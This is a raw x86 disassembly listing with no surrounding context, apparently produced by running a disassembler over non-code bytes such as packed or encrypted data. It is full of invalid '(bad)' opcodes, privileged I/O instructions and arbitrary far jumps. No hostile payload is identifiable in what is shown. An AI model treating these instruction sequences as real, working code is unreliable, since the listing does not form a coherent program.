  4168c4:	lods   eax,DWORD PTR ds:[esi]
  4168c5:	xchg   esp,eax
  4168c6:	pop    es
  4168c7:	cld    
  4168c8:	xor    eax,0xc3208a1e
  4168cd:	fwait
  4168ce:	push   ecx
  4168cf:	call   0x204a31ae
  4168d4:	scas   eax,DWORD PTR es:[edi]
  4168d5:	(bad)  
  4168d6:	je     0x4168ee
  4168d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168d9:	imul   edx,DWORD PTR [esi+0x12],0xfa493906
  4168e0:	mov    esi,0xbccb20b9
  4168e5:	cmp    al,dl
  4168e7:	inc    eax
  4168e8:	ror    BYTE PTR [edx],0x79
  4168eb:	js     0x4168c2
	...
  416955:	add    cl,dl
  416957:	scas   eax,DWORD PTR es:[edi]
  416958:	push   es
  416959:	repz jle 0x416957
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0x8342514e
  416966:	dec    ebx
  416967:	repz add BYTE PTR [eax],al
  41696a:	inc    DWORD PTR [eax]
  41696c:	add    BYTE PTR [eax],al
  41696e:	stc    
  41696f:	mov    eax,ds:0x9cc81799
  416974:	adc    al,BYTE PTR [edx+0x21]
  416977:	pop    eax
  416978:	sbb    ah,BYTE PTR [edx+esi*4-0x281ce170]
  41697f:	add    eax,0x8d503f5a
  416984:	push   DWORD PTR ds:[ecx+0x12]
  416988:	xchg   esp,eax
  416989:	pop    ebp
  41698a:	adc    al,0x60
  41698c:	jmp    0x416a01
  41698e:	in     al,0x30
  416990:	es cwde 
  416992:	fnsave ds:0x157caa1d
  416998:	dec    eax
  416999:	pop    esi
  41699a:	rol    DWORD PTR [ebx+ebp*4+0x3360c3ea],1
  4169a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169a2:	or     BYTE PTR [ebx-0x50],bl
  4169a5:	loop   0x41692d
  4169a7:	sbb    eax,0x26492e0d
  4169ac:	sbb    al,0x3e
  4169ae:	mov    ah,0xcd
  4169b0:	std    
  4169b1:	sar    DWORD PTR [esi+0x46],0x93
  4169b5:	mov    esp,DWORD PTR [edx]
  4169b7:	out    dx,eax
  4169b8:	pop    esi
  4169b9:	jge    0x41695d
  4169bb:	test   al,0x33
  4169bd:	mov    ah,0xff
  4169bf:	pop    ebp
  4169c0:	daa    
  4169c1:	ret    
  4169c2:	and    bh,BYTE PTR [edi+edi*8]
  4169c5:	mov    ch,0xe2
  4169c7:	clc    
  4169c8:	and    al,0xfb
  4169ca:	test   eax,0xb2ffe872
  4169cf:	ins    BYTE PTR es:[edi],dx
  4169d0:	jae    0x4169b4
  4169d2:	or     al,0xd0
  4169d4:	(bad)  
  4169d5:	pop    edi
  4169d6:	out    0x83,eax
  4169d8:	xchg   esi,eax
  4169d9:	xor    edi,edx
  4169db:	pop    ds
  4169dc:	cmp    ch,bh
  4169de:	sub    dl,bh
  4169e0:	jnp    0x4169c9
  4169e2:	jno    0x416a2c
  4169e4:	ja     0x4169a5
  4169e6:	push   0x4078ac5
  4169eb:	mov    eax,ds:0x5604434
  4169f0:	adc    BYTE PTR [ebp-0x1f1a852e],0xac
  4169f7:	sub    bh,dl
  4169f9:	adc    esp,DWORD PTR [eax+0x3a383172]
  4169ff:	add    edi,eax
  416a01:	(bad)  
  416a02:	fwait
  416a03:	xor    bl,al
  416a05:	sbb    bh,BYTE PTR [edi]
  416a07:	shr    bl,1
  416a09:	pushf  
  416a0a:	mov    cl,bh
  416a0c:	jg     0x416a7d
  416a0e:	sub    eax,0x450d1a18
  416a13:	inc    edx
  416a14:	xor    dl,BYTE PTR [edx-0x1f]
  416a17:	fdiv   DWORD PTR [ebx+0x48]
  416a1a:	sub    BYTE PTR [edx-0x554a6ce9],ch
  416a20:	sti    
  416a21:	or     al,0x93
  416a23:	loope  0x416a08
  416a25:	dec    ecx
  416a26:	cdq    
  416a27:	mov    ebx,0xb5544102
  416a2c:	(bad)  
  416a2d:	out    0x2e,eax
  416a2f:	jmp    0x2a10ff6a
  416a34:	jae    0x416a39
  416a36:	inc    esi
  416a37:	inc    ecx
  416a38:	inc    ebp
  416a39:	xor    BYTE PTR [edx],bh
  416a3b:	or     eax,0x7842518f
  416a40:	sub    ah,cl
  416a42:	cmp    BYTE PTR [edx],cl
  416a44:	xor    DWORD PTR [ebx+0x54],ebx
  416a47:	cs shl al,0xaf
  416a4b:	mov    esp,0xd260ae19
  416a50:	dec    edx
  416a51:	and    DWORD PTR [eax],edx
  416a53:	mov    cl,0xe2
  416a55:	lods   al,BYTE PTR ds:[esi]
  416a56:	mov    ecx,0x970c9a1b
  416a5b:	clc    
  416a5c:	gs aam 0xd2
  416a5f:	scas   eax,DWORD PTR es:[edi]
  416a60:	les    esi,FWORD PTR ds:0x3aee4c85
  416a66:	sub    BYTE PTR [edx-0xf5d0861],ch
  416a6c:	in     al,0x0
	...
  416ad6:	retf   
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0x1d5f0ba3
  416ae4:	jle    0x416b3a
  416ae6:	dec    edx
  416ae7:	hlt    
  416ae8:	add    BYTE PTR [eax],al
  416aea:	inc    DWORD PTR [eax]
  416aec:	add    BYTE PTR [eax],al
  416aee:	fstp   QWORD PTR [ebx+ecx*4+0x42]
  416af2:	cld    
  416af3:	jge    0x416aac
  416af5:	xor    BYTE PTR [ecx+ebp*2],bh
  416af8:	rcr    DWORD PTR [eax-0x72],1
  416afb:	xchg   DWORD PTR [esi+0x7e530951],ecx
  416b01:	or     BYTE PTR [ebp+0x3c961bf6],cl
  416b07:	out    0x5e,al
  416b09:	into   
  416b0a:	test   BYTE PTR [ebx],bh
  416b0c:	jne    0x416aef
  416b0e:	and    DWORD PTR ds:0x5b73efbf,ebp
  416b14:	fisub  WORD PTR [ebp-0x6a86ed46]
  416b1a:	dec    ebp
  416b1b:	jge    0x416b8f
  416b1d:	and    ch,dl
  416b1f:	adc    bl,BYTE PTR [edx-0x5d]
  416b22:	outs   dx,BYTE PTR ds:[esi]
  416b23:	das    
  416b24:	fpatan 
  416b26:	inc    esi
  416b27:	addr16 sti 
  416b29:	out    dx,eax
  416b2a:	dec    edx
  416b2b:	pslld  mm1,mm7
  416b2e:	outs   dx,DWORD PTR ds:[esi]
  416b2f:	test   DWORD PTR [ebx+edi*4],0x4e078419
  416b36:	int    0x92
  416b38:	add    bl,BYTE PTR [eax-0x2ca9acf6]
  416b3e:	inc    esp
  416b3f:	cwde   
  416b40:	sbb    DWORD PTR [edi-0x4ee3b7f],0xc23661f1
  416b4a:	outs   dx,BYTE PTR ds:[esi]
  416b4b:	inc    dh
  416b4d:	pop    ecx
  416b4e:	les    edx,FWORD PTR [esi+0x2b]
  416b51:	shr    BYTE PTR [eax],1
  416b53:	dec    edi
  416b54:	jae    0x416b71
  416b56:	pusha  
  416b57:	adc    bh,BYTE PTR ds:0x3314f112
  416b5d:	addr16 mov cl,0x5c
  416b60:	mov    edx,edx
  416b62:	adc    DWORD PTR ds:0xadd3133,edi
  416b68:	jl     0x416bba
  416b6a:	mov    dl,0x2e
  416b6c:	jmp    0x416b20
  416b6e:	cmp    DWORD PTR [ebx+0xd],edx
  416b71:	pop    ss
  416b72:	fcmovnbe st,st(6)
  416b74:	mov    ebx,0x6b4572b2
  416b79:	shr    BYTE PTR [edi-0x388fdeed],1
  416b7f:	shl    dl,1
  416b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b82:	cmp    ch,al
  416b84:	xor    eax,0x44d72bf2
  416b89:	add    al,BYTE PTR [ebp+ebp*8-0x2ecba868]
  416b90:	js     0x416c02
  416b92:	mov    ebx,0x3581fd4c
  416b97:	or     eax,esi
  416b99:	add    eax,DWORD PTR [ebx-0x3c99bc4e]
  416b9f:	xlat   BYTE PTR ds:[ebx]
  416ba0:	sbb    ebp,DWORD PTR fs:[ebx+edi*8-0x5f]
  416ba5:	and    ebp,DWORD PTR [edi]
  416ba7:	push   eax
  416ba8:	shl    BYTE PTR [edi-0x16],1
  416bab:	mov    eax,0x46f42e82
  416bb0:	dec    ebp
  416bb1:	jmp    0x78f6:0x5b2f6314
  416bb8:	or     eax,0xb89f8e1f
  416bbd:	jae    0x416bc8
  416bbf:	cmp    al,0x69
  416bc1:	and    al,0x49
  416bc3:	es fcom st(2)
  416bc6:	xchg   edi,eax
  416bc7:	in     al,0x4d
  416bc9:	out    dx,eax
  416bca:	add    ebp,esi
  416bcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bcd:	mov    al,0x91
  416bcf:	sub    ah,cl
  416bd1:	dec    esp
  416bd2:	jbe    0x416c1c
  416bd4:	xchg   DWORD PTR [ebx],ebp
  416bd6:	mov    al,ds:0xdc324331
  416bdb:	ins    DWORD PTR es:[edi],dx
  416bdc:	nop
  416bdd:	outs   dx,DWORD PTR ds:[esi]
  416bde:	xchg   edx,eax
  416bdf:	out    0xf4,eax
  416be1:	repnz rol BYTE PTR [ebx],0x44
  416be5:	sub    eax,0x85e8bdb2
  416bea:	ret    
  416beb:	aaa    
  416bec:	or     eax,0x0
	...
  416c55:	add    bl,ah
  416c57:	gs push cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0xe75b70a9
  416c63:	stc    
  416c64:	jno    0x416c88
  416c66:	dec    ecx
  416c67:	cmc    
  416c68:	add    BYTE PTR [eax],al
  416c6a:	inc    DWORD PTR [eax]
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	sub    eax,0xcd97c2ff
  416c73:	xor    DWORD PTR ds:0x6420d695,ebp
  416c79:	ficomp DWORD PTR [esi]
  416c7b:	out    0xe9,eax
  416c7d:	push   ds
  416c7e:	jbe    0x416cca
  416c80:	outs   dx,DWORD PTR ds:[esi]
  416c81:	and    cl,ch
  416c83:	in     al,0x42
  416c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c86:	rcr    ecx,0x8e
  416c89:	inc    edi
  416c8a:	es gs ds pop ecx
  416c8e:	push   es
  416c8f:	clc    
  416c90:	push   es
  416c91:	pop    edx
  416c92:	(bad)  
  416c93:	sahf   
  416c94:	aam    0xec
  416c96:	dec    esi
  416c97:	jae    0x416d16
  416c99:	fimul  DWORD PTR [ebx+0x4bda0d27]
  416c9f:	mov    ebp,0xe4f1db1e
  416ca4:	adc    BYTE PTR [esi+0x404d23e],0xd6
  416cab:	loopne 0x416c86
  416cad:	xchg   edx,eax
  416cae:	add    edi,DWORD PTR ds:0xa950ae7b
  416cb4:	and    DWORD PTR [edx],edx
  416cb6:	sbb    BYTE PTR [ecx-0x33f43ecd],bh
  416cbc:	frstor [ebp+0x38420dc1]
  416cc2:	sbb    cl,ch
  416cc4:	ss adc eax,0x9198b15d
  416cca:	push   eax
  416ccb:	fistp  QWORD PTR [edx]
  416ccd:	push   ebp
  416cce:	retf   
  416ccf:	jbe    0x416cde
  416cd1:	mov    ds:0xf141e572,al
  416cd6:	mov    BYTE PTR [edi],bh
  416cd8:	js     0x416cfa
  416cda:	shl    BYTE PTR [edi],1
  416cdc:	inc    esi
  416cdd:	push   edi
  416cde:	or     eax,DWORD PTR [esi+0x1e95647f]
  416ce4:	mov    cl,0x37
  416ce6:	mov    ds:0x2f5460e2,al
  416ceb:	add    al,0xf9
  416ced:	inc    edi
  416cee:	add    eax,DWORD PTR [ebx]
  416cf0:	jp     0x416d17
  416cf2:	and    DWORD PTR [esi-0x7e],edi
  416cf5:	pop    ds
  416cf6:	in     eax,0x15
  416cf8:	dec    ecx
  416cf9:	ins    DWORD PTR es:[edi],dx
  416cfa:	inc    BYTE PTR [ebp-0x33116993]
  416d00:	sbb    DWORD PTR ds:0x433d59ab,0x21
  416d07:	adc    BYTE PTR [edx-0x18],0xa4
  416d0b:	mov    WORD PTR [ebx+edi*4],ss
  416d0e:	dec    edi
  416d0f:	xchg   esi,eax
  416d10:	ror    BYTE PTR [esi],cl
  416d12:	push   ebx
  416d13:	jae    0x416ccd
  416d15:	xor    esp,0x64fdc48f
  416d1b:	ret    
  416d1c:	add    BYTE PTR [esi],dh
  416d1e:	sbb    eax,0xf3a6f573
  416d23:	fisub  WORD PTR [esi]
  416d25:	ror    DWORD PTR [eax],1
  416d27:	mov    al,BYTE PTR [edx-0x68]
  416d2a:	retf   0x81a5
  416d2d:	jecxz  0x416d9f
  416d2f:	rcr    BYTE PTR [eax-0x3afa9ea8],1
  416d35:	dec    ebx
  416d36:	mov    al,0x98
  416d38:	(bad)  
  416d39:	rcl    eax,0xad
  416d3c:	or     DWORD PTR [ebx+0x25ad6a03],esp
  416d42:	mov    edx,0xaf545452
  416d47:	not    BYTE PTR [edx+0x7d]
  416d4a:	arpl   WORD PTR [eax],sp
  416d4c:	inc    ebx
  416d4d:	daa    
  416d4e:	or     BYTE PTR [edx+0x2f4c41af],al
  416d54:	pop    edi
  416d55:	fild   QWORD PTR [edx+0xf]
  416d58:	or     al,0x6
  416d5a:	dec    ebp
  416d5b:	mov    ds:0x479f3feb,al
  416d60:	adc    DWORD PTR [edx+0x36],ebp
  416d63:	sbb    ch,BYTE PTR [esi+0x3a]
  416d66:	inc    eax
  416d67:	(bad)  
  416d68:	outs   dx,DWORD PTR ds:[esi]
  416d69:	shr    cl,0x47
  416d6c:	nop
	...
  416dd5:	add    BYTE PTR [ecx],ah
  416dd7:	xchg   ebx,eax
  416dd8:	mov    DWORD PTR [edi-0x60d84045],ebp
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416de3:	mov    dl,0x3c
  416de5:	loope  0x416e2f
  416de7:	test   BYTE PTR [eax],0x0
  416dea:	inc    DWORD PTR [eax]
  416dec:	add    BYTE PTR [eax],al
  416dee:	aaa    
  416def:	xchg   DWORD PTR [ecx],esp
  416df1:	inc    ebx
  416df2:	xchg   ebp,eax
  416df3:	xchg   BYTE PTR ds:0xd39886bd,dl
  416df9:	(bad)  
  416dfa:	ffree  st(5)
  416dfc:	loop   0x416e78
  416dfe:	scas   al,BYTE PTR es:[edi]
  416dff:	cmp    eax,0x40d9662c
  416e04:	adc    esp,esp
  416e06:	pop    ebx
  416e07:	scas   eax,DWORD PTR es:[edi]
  416e08:	mov    ecx,0x2af3a95b
  416e0d:	fist   WORD PTR [ebx+0x23af47af]
  416e13:	add    BYTE PTR [esi],0x26
  416e16:	add    al,0xe5
  416e18:	add    al,0x51
  416e1a:	gs popf 
  416e1c:	mov    ah,0xb3
  416e1e:	pusha  
  416e1f:	mov    BYTE PTR [eax+0x7fd2c247],0xfa
  416e26:	out    dx,al
  416e27:	aaa    
  416e28:	push   esi
  416e29:	out    dx,al
  416e2a:	daa    
  416e2b:	and    ch,BYTE PTR [ebx-0x1e]
  416e2e:	lahf   
  416e2f:	or     eax,0xb881c7e4
  416e34:	inc    edx
  416e35:	sbb    DWORD PTR ds:0x50cc2023,edi
  416e3b:	aaa    
  416e3c:	loopne 0x416e11
  416e3e:	aad    0xc3
  416e40:	pushf  
  416e41:	mov    edx,0x90797926
  416e46:	push   ebx
  416e47:	dec    ebx
  416e48:	es cmc 
  416e4a:	es retf 0x8430
  416e4e:	pop    esp
  416e4f:	shl    DWORD PTR [edi+eiz*2-0x65009456],1
  416e56:	jno    0x416ed6
  416e58:	ret    
  416e59:	push   esi
  416e5a:	xor    eax,0x49e4729d
  416e5f:	not    DWORD PTR [esi]
  416e61:	fdivr  DWORD PTR [esp+esi*1]
  416e64:	sbb    esp,edi
  416e66:	xchg   edx,eax
  416e67:	daa    
  416e68:	or     ch,dl
  416e6a:	mov    dh,0xd7
  416e6c:	xchg   edx,eax
  416e6d:	(bad)  
  416e6e:	stos   DWORD PTR es:[edi],eax
  416e6f:	push   ebx
  416e70:	mov    dh,0xf9
  416e72:	test   al,0xf9
  416e74:	jb     0x416ee8
  416e76:	(bad)  
  416e77:	sbb    esi,edx
  416e79:	cmp    BYTE PTR [ebx+0x14],0xcb
  416e7d:	jp     0x416e9b
  416e7f:	mov    eax,0x3f6ce3b9
  416e84:	fwait
  416e85:	xchg   ecx,eax
  416e86:	in     eax,dx
  416e87:	(bad)  
  416e88:	xchg   esi,eax
  416e89:	rol    BYTE PTR [ebx-0x49],cl
  416e8c:	push   edx
  416e8d:	push   es
  416e8e:	retf   0x6df2
  416e91:	test   BYTE PTR [edx+0x48052508],bh
  416e97:	add    al,ch
  416e99:	popa   
  416e9a:	das    
  416e9b:	pop    edi
  416e9c:	(bad)  [ebx+0x58]
  416e9f:	push   ecx
  416ea0:	lahf   
  416ea1:	push   edi
  416ea2:	mov    edi,0xa5c181ae
  416ea7:	retf   
  416ea8:	xor    BYTE PTR [ecx],ah
  416eaa:	fisubr DWORD PTR [ebx-0x77]
  416ead:	mov    ch,0xce
  416eaf:	pusha  
  416eb0:	pop    es
  416eb1:	sti    
  416eb2:	mov    edx,0x64b6d80c
  416eb7:	cmp    al,0x35
  416eb9:	in     eax,dx
  416eba:	jmp    0x416ecf
  416ebc:	retf   0x806
  416ebf:	mov    eax,ds:0x367a05f4
  416ec4:	out    0xee,eax
  416ec6:	inc    ebx
  416ec7:	jo     0x416e9b
  416ec9:	or     DWORD PTR [esi+0x7f3e7800],edx
  416ecf:	test   al,0xf6
  416ed1:	jns    0x416ed8
  416ed3:	ds mov bl,0x55
  416ed6:	push   ecx
  416ed7:	rdpmc  
  416ed9:	pop    ecx
  416eda:	fld    QWORD PTR [edi]
  416edc:	cmp    BYTE PTR [eax+0x1b],ah
  416edf:	sbb    BYTE PTR [esi-0x688122b4],dh
  416ee5:	xlat   BYTE PTR ds:[ebx]
  416ee6:	cld    
  416ee7:	popa   
  416ee8:	push   edx
  416ee9:	or     bh,BYTE PTR [ebx+0x5563]
	...
  416f53:	add    BYTE PTR [eax],al
  416f55:	add    BYTE PTR [edi-0x519271e7],bh
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x36ee8eea
  416f64:	inc    eax
  416f65:	ds inc edi
  416f67:	test   DWORD PTR [eax],0xff00
  416f6d:	add    BYTE PTR [eax],bh
  416f6f:	test   DWORD PTR [ebp-0x5b],0x68715c4a
  416f76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f77:	shl    BYTE PTR [esp+ebx*1-0x7c772197],0xe2
  416f7f:	xor    eax,0x95b2f0b8
  416f84:	lea    esp,[ebx+0x4ce7b707]
  416f8a:	and    eax,0x78d308bb
  416f8f:	(bad)  
  416f90:	das    
  416f91:	movd   mm2,DWORD PTR [edx+0x71526a8]
  416f98:	jno    0x416f60
  416f9a:	and    esp,DWORD PTR [esi+0x76fabfd8]
  416fa0:	jo     0x416f72
  416fa2:	ficomp WORD PTR [edx]
  416fa4:	xchg   ecx,eax
  416fa5:	sub    ah,BYTE PTR [ecx-0x58a931e2]
  416fab:	dec    edx
  416fac:	mov    al,0x53
  416fae:	push   edi
  416faf:	xor    eax,0xfafb981
  416fb4:	adc    al,0x5f
  416fb6:	int3   
  416fb7:	aad    0x56
  416fb9:	popa   
  416fba:	add    edx,DWORD PTR [edi-0x5d]
  416fbd:	(bad)  
  416fbe:	cmp    eax,0xf032f9f7
  416fc3:	std    
  416fc4:	inc    esi
  416fc5:	pop    esi
  416fc6:	dec    esi
  416fc7:	mov    eax,0xb23de849
  416fcc:	sbb    DWORD PTR [ebp+0x73],ebx
  416fcf:	test   BYTE PTR [edi],0x8b
  416fd2:	mov    ebx,0x1852d89b
  416fd7:	in     al,0xe5
  416fd9:	sbb    BYTE PTR [ebx],0x8f
  416fdc:	xlat   BYTE PTR ds:[ebx]
  416fdd:	lea    ebx,[eax+eax*2]
  416fe0:	aad    0x31
  416fe2:	rol    esp,1
  416fe4:	loopne 0x416f72
  416fe6:	jge    0x41701c
  416fe8:	or     ch,BYTE PTR ds:0x21a57d13
  416fee:	mov    al,ds:0xeb3efcdd
  416ff3:	icebp  
  416ff4:	jg     0x416fd3
  416ff6:	xchg   ebx,eax
  416ff7:	sub    BYTE PTR [ecx+esi*2],dl
  416ffa:	imul   esp,DWORD PTR [ebx-0x1dcb40ba],0x7b
  417001:	jle    0x416fe8
  417003:	fild   QWORD PTR [ebx+0x3f]
  417006:	push   ebp
  417007:	es push ebp
  417009:	shl    ecx,0xa9
  41700c:	adc    eax,0xd530ef99
  417011:	push   0x62352fe
  417016:	lock sbb BYTE PTR [edx+esi*2-0x35a19621],ah
  41701e:	sahf   
  41701f:	xchg   edi,eax
  417020:	pop    edi
  417021:	das    
  417022:	lahf   
  417023:	adc    DWORD PTR [ebx],edx
  417025:	repnz dec eax
  417027:	push   0x7
  417029:	mov    ah,0x9b
  41702b:	or     BYTE PTR [edi-0x1a78e0b2],dl
  417031:	les    edx,FWORD PTR [edi-0x129866b5]
  417037:	pop    ss
  417038:	pop    ss
  417039:	mov    dl,bl
  41703b:	sub    al,0x14
  41703d:	sub    dl,BYTE PTR [esi-0x9]
  417040:	pushf  
  417041:	dec    edx
  417042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417043:	dec    ebp
  417044:	lods   eax,DWORD PTR ds:[esi]
  417045:	add    bl,BYTE PTR [ebp+0x635e0bd9]
  41704b:	jo     0x417093
  41704d:	sub    eax,0xec6ac30b
  417052:	scas   eax,DWORD PTR es:[edi]
  417053:	test   al,0x3d
  417055:	hlt    
  417056:	(bad)  
  417057:	or     BYTE PTR ds:0xbf449a02,bh
  41705d:	cmp    BYTE PTR [edx+0x2285a7af],ch
  417063:	push   cs
  417064:	ret    0x608e
  417067:	xchg   esp,eax
  417068:	loope  0x41707f
  41706a:	iret   
  41706b:	mov    BYTE PTR [ecx+0x0],ch
	...
  4170d6:	jbe    0x417105
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    edi,edx
  4170e3:	call   0x0:0xf846ee68
  4170ea:	inc    DWORD PTR [eax]
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	mov    esi,0x7864f417
  4170f3:	mov    BYTE PTR [edx+0x70328bd9],dh
  4170f9:	sbb    eax,0xdfd0bee
  4170fe:	or     al,0x7d
  417100:	xchg   edx,eax
  417101:	jmp    FWORD PTR [ebx]
  417103:	leave  
  417104:	sbb    BYTE PTR ds:0x3516e3be,ch
  41710a:	je     0x417157
  41710c:	cmp    edi,ebx
  41710e:	or     al,0xa2
  417110:	xchg   edx,eax
  417111:	xchg   ebx,eax
  417112:	xchg   esp,eax
  417113:	push   0xcbffb00
  417118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417119:	rcr    BYTE PTR [esi+0x2b],1
  41711c:	mov    DWORD PTR [edx],ecx
  41711e:	and    DWORD PTR [esi+0x62828194],0xde5d019c
  417128:	inc    ebp
  417129:	push   edx
  41712a:	mov    dh,0xbe
  41712c:	dec    ebp
  41712d:	push   es
  41712e:	loop   0x417135
  417130:	and    edi,0x2
  417133:	adc    DWORD PTR [eax+0x4d],edx
  417136:	sub    dh,ch
  417138:	pop    ebp
  417139:	mov    ds:0x6a05ded4,eax
  41713e:	fdiv   st(2),st
  417140:	mov    edx,0x1a6c5d2b
  417145:	jecxz  0x4170dc
  417147:	dec    esp
  417148:	retf   0xc414
  41714b:	xlat   BYTE PTR ds:[ebx]
  41714c:	jecxz  0x417101
  41714e:	and    al,BYTE PTR [edx+0x4a]
  417151:	bound  ebp,QWORD PTR [esi-0x11]
  417154:	in     eax,0x68
  417156:	mov    dl,0x1c
  417158:	(bad)  
  417159:	pop    edi
  41715a:	push   esi
  41715b:	lods   eax,DWORD PTR ds:[esi]
  41715c:	sbb    ch,bh
  41715e:	mov    ecx,ecx
  417160:	and    al,0x1d
  417162:	retf   0x288d
  417165:	pop    ebp
  417166:	inc    eax
  417167:	adc    al,al
  417169:	lds    ebx,FWORD PTR [eax+0x1352315]
  41716f:	cmp    bl,cl
  417171:	sub    BYTE PTR [ecx+0x2d],ch
  417174:	(bad)  ds:0x25f88099
  41717a:	adc    BYTE PTR [esp+ecx*2-0x3bc58ccf],dh
  417181:	inc    esi
  417182:	mov    eax,0xa871a978
  417187:	call   FWORD PTR [esi-0x1b]
  41718a:	mov    esi,0x99f773b5
  41718f:	xor    eax,DWORD PTR [edi-0x10]
  417192:	jns    0x41712e
  417194:	jge    0x417147
  417196:	pop    esp
  417197:	movd   DWORD PTR [ebp-0x3a],mm3
  41719b:	inc    edx
  41719c:	jne    0x41714e
  41719e:	nop
  41719f:	test   al,0xbb
  4171a1:	inc    ecx
  4171a2:	out    0xcb,eax
  4171a4:	mov    ch,0x30
  4171a6:	jge    0x417170
  4171a8:	shl    al,cl
  4171aa:	or     al,0x9c
  4171ac:	fcmovu st,st(0)
  4171ae:	js     0x417197
  4171b0:	pop    es
  4171b1:	mov    bh,0xb2
  4171b3:	leave  
  4171b4:	scas   al,BYTE PTR es:[edi]
  4171b5:	add    BYTE PTR [ebp+0x338963a6],0xad
  4171bc:	mov    ?,WORD PTR [edx+ebx*4]
  4171bf:	inc    eax
  4171c0:	fisubr WORD PTR [ebp-0x607150a6]
  4171c6:	mov    eax,ds:0x5466d0b1
  4171cb:	das    
  4171cc:	pop    edx
  4171cd:	and    eax,0x673f6075
  4171d2:	aaa    
  4171d3:	daa    
  4171d4:	xchg   esi,eax
  4171d5:	cs imul ecx,esi,0xe01a44bc
  4171dc:	xchg   esi,eax
  4171dd:	or     eax,0x61c990fe
  4171e2:	mov    ch,0xaf
  4171e4:	xchg   BYTE PTR [edx+0x7a8b8c0b],bl
  4171ea:	lods   eax,DWORD PTR ds:[esi]
  4171eb:	jbe    0x417219
	...
  417255:	add    BYTE PTR [esi-0xe58fe7],ah
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	ja     0x417214
  417264:	ficomp WORD PTR [ebp+eax*2-0x7]
  417268:	add    BYTE PTR [eax],al
  41726a:	inc    DWORD PTR [eax]
  41726c:	add    BYTE PTR [eax],al
  41726e:	dec    eax
  41726f:	pop    ecx
  417270:	in     al,0x69
  417272:	(bad)  
  417273:	adc    BYTE PTR [edi+edi*1-0x425a899],dh
  41727a:	xor    al,0x83
  41727c:	mov    ch,0xd9
  41727e:	push   0x2b
  417280:	mov    ebx,DWORD PTR [esi+0x19387fc5]
  417286:	sti    
  417287:	loopne 0x4172f3
  417289:	jmp    FWORD PTR [ecx+0x6d]
  41728c:	lock mov dl,0xcc
  41728f:	cld    
  417290:	pop    eax
  417291:	jo     0x4172a8
  417293:	mov    esi,0x56decce9
  417298:	loopne 0x4172c6
  41729a:	push   ss
  41729b:	les    esp,FWORD PTR [esi]
  41729d:	jle    0x41727e
  41729f:	inc    eax
  4172a0:	sar    al,cl
  4172a2:	into   
  4172a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172a4:	cmp    BYTE PTR [esi-0x5f02276],cl
  4172aa:	xchg   esp,eax
  4172ab:	sub    bh,cl
  4172ad:	pop    ebx
  4172ae:	retf   0xf332
  4172b1:	push   edi
  4172b2:	mov    edx,0x97484cac
  4172b7:	mov    cl,BYTE PTR ds:0xc31a08cc
  4172bd:	push   eax
  4172be:	pop    ds
  4172bf:	fst    QWORD PTR [edi-0x6c]
  4172c2:	mov    esp,0x79a3a56f
  4172c7:	xor    eax,0x2c3f7ec3
  4172cc:	jge    0x4172d7
  4172ce:	sbb    edi,esi
  4172d0:	imul   esi,DWORD PTR [esp-0x2678c5fa],0x13869189
  4172db:	ss dec ebx
  4172dd:	jmp    0xf5db:0x98e6b3e4
  4172e4:	std    
  4172e5:	nop
  4172e6:	mov    DWORD PTR [ebp+0x318b5083],edi
  4172ec:	inc    edi
  4172ed:	sbb    DWORD PTR [edi],esp
  4172ef:	push   ecx
  4172f0:	div    BYTE PTR [ebx]
  4172f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172f3:	(bad)  
  4172f4:	push   cs
  4172f5:	lock in eax,dx
  4172f7:	retf   0x171f
  4172fa:	cwde   
  4172fb:	add    dl,0xd6
  4172fe:	repz shl DWORD PTR [edi-0x4a],0xa1
  417303:	pop    es
  417304:	fadd   st(7),st
  417306:	push   ecx
  417307:	mov    al,ds:0x1ef7f09e
  41730c:	push   0xffffff98
  41730e:	aas    
  41730f:	jbe    0x417362
  417311:	aaa    
  417312:	or     dh,ah
  417314:	jno    0x4172fd
  417316:	in     al,0x4
  417318:	das    
  417319:	lahf   
  41731a:	sub    ebx,DWORD PTR [edx-0x2a04e028]
  417320:	xchg   ebx,eax
  417321:	cmc    
  417322:	retf   0x92aa
  417325:	mov    al,dl
  417327:	lahf   
  417328:	cmp    eax,0xbb9eba4f
  41732d:	or     DWORD PTR [edx+0x51],edx
  417330:	daa    
  417331:	pop    ds
  417332:	(bad)  
  417333:	and    ecx,edi
  417335:	dec    ebx
  417336:	sbb    eax,0x893c6505
  41733b:	test   al,cl
  41733d:	fimul  DWORD PTR [esi]
  41733f:	call   0xd6a2803a
  417344:	imul   esp,DWORD PTR [esi+0x187eed35],0xffffffb2
  41734b:	mov    bh,0x21
  41734d:	(bad)  
  41734f:	dec    ebp
  417350:	adc    al,0xd5
  417352:	ret    0x7b7c
  417355:	mov    dh,0x7e
  417357:	add    DWORD PTR [ecx-0x1b],edi
  41735a:	fsubp  st(4),st
  41735c:	pop    es
  41735d:	mov    cl,0xa0
  41735f:	call   0x501c:0xe47f5a1f
  417366:	int3   
  417367:	aaa    
  417368:	in     al,0xbc
